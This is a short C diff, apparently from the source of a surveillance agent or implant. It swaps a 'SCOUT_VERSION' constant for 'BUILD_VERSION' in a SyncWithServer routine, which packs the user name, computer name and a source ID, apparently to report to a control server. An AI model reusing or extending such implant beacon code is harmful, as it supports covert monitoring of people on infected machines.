@@ -17,6 +17,8 @@
 #include "agent_screenshot.h"
 #include "main.h"
 
+#undef _GLOBAL_VERSION_FUNCTIONS_ //be sure not to include the global function (multiple declaration error)
+#include "version.h"
 
 BYTE pServerKey[32];
 BYTE pConfKey[32];
@@ -469,7 +471,7 @@ BOOL SyncWithServer()
 
 	ULONG uBuffLen = sizeof(ULONG) + uUserLen + uComputerLen + uSourceLen;
 	pBuffer = (PBYTE)malloc(uBuffLen);
-	*(PULONG)pBuffer = SCOUT_VERSION;
+	*(PULONG)pBuffer = BUILD_VERSION;
 	memcpy(pBuffer + sizeof(ULONG), pUserNamePascal, uUserLen);
 	memcpy(pBuffer + sizeof(ULONG) + uUserLen, pComputerNamePascal, uComputerLen);
 	memcpy(pBuffer + sizeof(ULONG) + uUserLen + uComputerLen, pSourceIdPascal, uSourceLen);
